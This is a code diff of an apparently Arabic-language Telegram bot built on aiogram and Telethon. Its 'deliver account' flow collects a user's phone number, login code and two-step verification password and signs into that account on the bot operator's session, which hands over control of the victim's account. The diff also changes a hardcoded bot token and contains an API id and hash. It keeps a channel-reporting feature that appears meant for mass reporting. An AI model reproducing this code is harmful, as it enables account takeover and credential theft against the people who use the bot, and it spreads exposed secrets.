@@ -2,12 +2,11 @@ from aiogram import Bot, Dispatcher, types
 from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
 from aiogram.utils import executor
 from telethon import TelegramClient
-from telethon.tl.functions.account import ReportPeerRequest
-from telethon.tl.types import InputReportReasonPornography, InputReportReasonViolence
+from telethon.errors import SessionPasswordNeededError, PhoneNumberOccupiedError, PhoneCodeInvalidError
 import asyncio
 
 # توكن البوت الخاص بك من @BotFather
-BOT_TOKEN = '7492900908:AAGiiLlsafD-O4Fam6r5vP07vo2I8IeXVCc'
+BOT_TOKEN = '7852676274:AAHIx3Q9qFbylmvHKDhbhT5nEpFOFA5i2CM'
 api_id = 16748685
 api_hash = 'f0c8f7e4a7a50b5c64fd5243a256fd2f'
 
@@ -18,7 +17,7 @@ dp = Dispatcher(bot)
 # إعداد عميل Telegram
 client = TelegramClient('session_name', api_id, api_hash)
 
-# بدء البوت مع خيارات
+# بداية استقبال الأوامر
 @dp.message_handler(commands=['start'])
 async def start_command(message: types.Message):
     keyboard = InlineKeyboardMarkup(row_width=1)
@@ -28,39 +27,59 @@ async def start_command(message: types.Message):
     )
     await message.answer("مرحبًا! اختر أحد الخيارات التالية:", reply_markup=keyboard)
 
-# زر "تسليم حساب"
+# عند اختيار "تسليم حساب"
 @dp.callback_query_handler(lambda c: c.data == 'deliver_account')
 async def deliver_account(callback_query: types.CallbackQuery):
     await callback_query.message.answer("يرجى إدخال رقم الهاتف مع رمز الدولة:")
     await bot.register_next_step_handler(callback_query.message, receive_phone)
 
+# استقبال رقم الهاتف
 async def receive_phone(message: types.Message):
     phone_number = message.text.strip()
+
     try:
         await client.connect()
-        if await client.is_user_authorized():
-            await message.answer("الرقم مسجل مسبقًا.")
-        else:
-            await client.send_code_request(phone_number)
-            await message.answer("تم إرسال كود التحقق، يرجى إدخاله:")
-            await bot.register_next_step_handler(message, receive_code, phone_number)
+        # طلب الكود للتحقق
+        await client.send_code_request(phone_number)
+        await message.answer("تم إرسال كود التحقق، يرجى إدخاله:")
+        await bot.register_next_step_handler(message, receive_code, phone_number)
+    except PhoneNumberOccupiedError:
+        await message.answer("هذا الرقم مسجل مسبقًا.")
     except Exception as e:
-        await message.answer(f"حدث خطأ: {str(e)}")
+        await message.answer(f"حدث خطأ أثناء إرسال الكود: {str(e)}")
 
+# استقبال كود التحقق
 async def receive_code(message: types.Message, phone_number):
     code = message.text.strip()
+
     try:
         await client.sign_in(phone_number, code)
         await message.answer("تم تسجيل الدخول بنجاح!")
+    except PhoneCodeInvalidError:
+        await message.answer("كود التحقق غير صحيح، يرجى المحاولة مجددًا.")
+    except SessionPasswordNeededError:
+        await message.answer("يرجى إدخال كلمة مرور التحقق بخطوتين:")
+        await bot.register_next_step_handler(message, receive_password)
     except Exception as e:
-        await message.answer(f"خطأ أثناء تسجيل الدخول: {str(e)}")
+        await message.answer(f"حدث خطأ أثناء التحقق: {str(e)}")
 
-# زر الإبلاغ عن قناة أو مجموعة
+# استقبال كلمة مرور التحقق بخطوتين
+async def receive_password(message: types.Message):
+    password = message.text.strip()
+
+    try:
+        await client.sign_in(password=password)
+        await message.answer("تم تسجيل الدخول بنجاح!")
+    except Exception as e:
+        await message.answer(f"حدث خطأ أثناء إدخال كلمة المرور: {str(e)}")
+
+# زر "الإبلاغ عن قناة/مجموعة"
 @dp.callback_query_handler(lambda c: c.data == 'report_channel')
 async def report_channel(callback_query: types.CallbackQuery):
     await callback_query.message.answer("يرجى إدخال اسم المستخدم أو الرابط للقناة/المجموعة:")
     await bot.register_next_step_handler(callback_query.message, receive_username)
 
+# استقبال اسم المستخدم أو الرابط
 async def receive_username(message: types.Message):
     channel_username = message.text.strip()
     try:
